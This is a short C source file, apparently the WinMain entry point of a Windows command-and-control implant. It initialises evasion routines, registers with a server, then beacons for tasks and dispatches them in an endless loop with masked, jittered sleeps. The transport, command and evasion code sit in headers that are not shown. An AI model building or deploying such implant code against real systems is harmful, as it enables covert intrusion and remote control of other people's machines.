#include <windows.h>
#include "config.h"
#include "transport.h"
#include "commands.h"
#include "evasion.h"

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    (void)hInst; (void)hPrev; (void)lpCmd; (void)nShow;

    evasion_init();

    while (!agent_register()) {
        sleep_masked(30000);
    }

    for (;;) {
        int count = 0;
        AgentTask *tasks = agent_beacon(&count);
        for (int i = 0; i < count; i++) {
            dispatch_task(&tasks[i]);
        }
        tasks_free(tasks, count);
        sleep_masked(sleep_ms_jitter());
    }
}
